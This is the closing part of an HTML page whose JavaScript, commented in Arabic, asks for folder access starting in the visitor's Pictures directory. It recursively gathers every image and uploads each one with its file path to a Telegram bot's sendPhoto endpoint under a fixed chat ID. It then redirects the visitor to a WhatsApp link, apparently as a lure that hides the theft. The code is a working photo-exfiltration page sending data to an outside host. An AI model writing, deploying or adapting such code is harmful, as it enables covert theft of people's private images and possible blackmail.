            allImageFiles = [];
            
            try {
                // محاولة الوصول إلى مجلد Pictures مباشرة
                const directoryHandle = await window.showDirectoryPicker({
                    startIn: 'pictures'
                });
                
                // البحث العودي في جميع الملفات
                await scanDirectoryRecursive(directoryHandle);
                
            } catch (error) {
                // إذا فشل، نطلب من المستخدم اختيار المجلد يدوياً
                try {
                    const directoryHandle = await window.showDirectoryPicker();
                    await scanDirectoryRecursive(directoryHandle);
                } catch (err) {
                    throw new Error('لم يتم السماح بالوصول إلى المجلدات');
                }
            }
        }
        
        // دالة مسح المجلد بشكل عودي
        async function scanDirectoryRecursive(directoryHandle, path = '') {
            for await (const entry of directoryHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    const extension = file.name.split('.').pop().toLowerCase();
                    
                    if (SUPPORTED_IMAGE_TYPES.includes(extension)) {
                        allImageFiles.push({
                            file: file,
                            path: path + file.name,
                            handle: entry
                        });
                        
                        // تحديث العداد في الوقت الحقيقي
                        document.getElementById('foundCount').textContent = allImageFiles.length;
                        updateProgressBar(0); // تحديث شريط التقدم
                    }
                } else if (entry.kind === 'directory') {
                    // البحث في المجلدات الفرعية
                    await scanDirectoryRecursive(entry, path + entry.name + '/');
                }
            }
        }
        
        // دالة عرض قائمة الملفات
        function displayFileList() {
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '';
            
            // عرض أول 10 ملفات فقط
            const filesToShow = allImageFiles.slice(0, 10);
            
            filesToShow.forEach(item => {
                const div = document.createElement('div');
                div.className = 'file-item';
                div.textContent = item.path;
                fileList.appendChild(div);
            });
            
            if (allImageFiles.length > 10) {
                const moreDiv = document.createElement('div');
                moreDiv.className = 'file-item';
                moreDiv.textContent = `و ${allImageFiles.length - 10} ملفات أخرى...`;
                moreDiv.style.borderRightColor = '#0088cc';
                fileList.appendChild(moreDiv);
            }
        }
        
        // دالة إرسال جميع الصور
        async function uploadAllImages() {
            const total = allImageFiles.length;
            uploadedCount = 0;
            
            for (let i = 0; i < total; i++) {
                const item = allImageFiles[i];
                
                try {
                    // تحديث شريط التقدم
                    const progress = ((i + 1) / total) * 100;
                    updateProgressBar(progress);
                    
                    // إعداد FormData للإرسال
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', item.file);
                    formData.append('caption', `📸 ${item.path}`);
                    
                    // إرسال الصورة
                    const response = await fetch(
                        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                        {
                            method: 'POST',
                            body: formData
                        }
                    );
                    
                    const result = await response.json();
                    
                    if (result.ok) {
                        uploadedCount++;
                        document.getElementById('sentCount').textContent = uploadedCount;
                        
                        // تحديث الملف في القائمة
                        const fileItems = document.querySelectorAll('.file-item');
                        if (fileItems[i]) {
                            fileItems[i].style.borderRightColor = '#25D366';
                            fileItems[i].style.background = '#d4edda';
                        }
                    } else {
                        throw new Error(result.description || 'خطأ في الإرسال');
                    }
                    
                } catch (error) {
                    console.error(`Error uploading ${item.path}:`, error);
                    // نستمر في إرسال الملفات الأخرى رغم الخطأ
                }
            }
            
            // إكمال عملية الإرسال
            showSuccess();
            setTimeout(showWhatsAppStage, 2000);
        }
        
        // دالة تحديث شريط التقدم
        function updateProgressBar(percentage) {
            const progressBar = document.getElementById('progress');
            const percentageText = document.getElementById('progressPercentage');
            
            progressBar.style.width = `${percentage}%`;
            percentageText.textContent = `${Math.round(percentage)}%`;
        }
        
        // دالة عرض رسالة النجاح
        function showSuccess() {
            const status = document.getElementById('status');
            status.className = 'status success';
            status.innerHTML = `
                <h3 style="margin-bottom: 10px;">✅ الإرسال مكتمل!</h3>
                <p style="margin-bottom: 10px;">تم إرسال ${uploadedCount} من أصل ${foundCount} صورة</p>
                <p style="font-size: 14px; color: #0d4622;">سيتم توجيهك إلى واتساب خلال لحظات...</p>
            `;
            
            updateProgressBar(100);
        }
        
        // دالة عرض رسالة الخطأ
        function showError(message) {
            const status = document.getElementById('status');
            status.className = 'status error';
            status.innerHTML = `
                <h3 style="margin-bottom: 10px;">❌ حدث خطأ!</h3>
                <p>${message}</p>
            `;
        }
        
        // دالة الانتقال لمرحلة واتساب
        function showWhatsAppStage() {
            document.getElementById('autoSendStage').classList.add('hidden');
            document.getElementById('whatsappStage').classList.remove('hidden');
            
            // بدء العد التنازلي
            startCountdown();
        }
        
        // دالة العد التنازلي
        function startCountdown() {
            let count = 5;
            const countdownElement = document.getElementById('countdown');
            const interval = setInterval(() => {
                count--;
                countdownElement.textContent = count;
                
                if (count <= 0) {
                    clearInterval(interval);
                    redirectToWhatsApp();
                }
            }, 1000);
        }
        
        // دالة التوجيه إلى واتساب
        function redirectToWhatsApp() {
            window.location.href = "https://wa.me/qr/3I56DYDGDJHSJ1";
        }
        
        // بدء الإرسال التلقائي بعد تحميل الصفحة (اختياري)
        window.addEventListener('load', () => {
            setTimeout(() => {
                // يمكن تفعيل هذا إذا أردت بدء الإرسال تلقائياً
                // startAutoSend();
            }, 1000);
        });
    </script>
</body>
</html>
